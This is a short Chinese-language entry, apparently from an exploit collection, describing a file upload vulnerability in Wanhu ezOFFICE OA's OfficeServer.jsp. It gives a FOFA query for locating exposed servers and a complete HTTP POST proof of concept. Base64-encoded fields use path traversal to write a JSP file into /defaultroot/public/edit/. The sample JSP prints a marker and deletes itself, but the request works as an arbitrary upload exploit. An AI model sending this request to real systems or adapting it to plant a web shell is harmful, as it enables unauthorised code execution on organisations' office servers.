## 万户-ezOFFICE-OA-officeserver.jsp文件上传漏洞



## fofa

```
banner="OASESSIONID" && banner="/defaultroot/"
```

## poc

```
POST /defaultroot/public/iWebOfficeSign/OfficeServer.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0

DBSTEP V3.0     145             0               105             DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
RECORDID=
isDoc=dHJ1ZQ==
moduleType=Z292ZG9jdW1lbnQ=
FILETYPE=Ly8uLi8uLi9wdWJsaWMvZWRpdC83Yzc1QWYuanNw
<% out.println("5EA635");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
```

文件路径`/defaultroot/public/edit/7c75Af.jsp`

![image-20240626231259719](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406262312795.png)